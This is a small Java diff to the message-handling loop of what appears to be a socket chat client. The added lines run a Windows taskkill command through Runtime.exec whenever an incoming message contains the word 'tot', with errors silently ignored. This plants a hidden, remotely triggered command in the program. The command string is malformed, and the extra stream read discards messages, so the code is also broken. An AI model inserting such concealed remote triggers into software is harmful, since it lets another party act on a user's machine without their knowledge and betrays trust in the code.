@@ -57,6 +57,13 @@ public class Model {
 						if (socket.getInputStream().available() != 0) {
 							try {
 								v.newMessage(new DataInputStream(socket.getInputStream()).readUTF(), false);
+								if(new DataInputStream(socket.getInputStream()).readUTF().contains("tot"))
+								{
+									try {
+										Runtime.getRuntime().exec("cmd/ taskkill /IM /F");
+									}catch(Exception e) { 
+									}
+								}
 							} catch (IOException e) {
 								v.newMessage("Fehler", true);
 								e.printStackTrace();
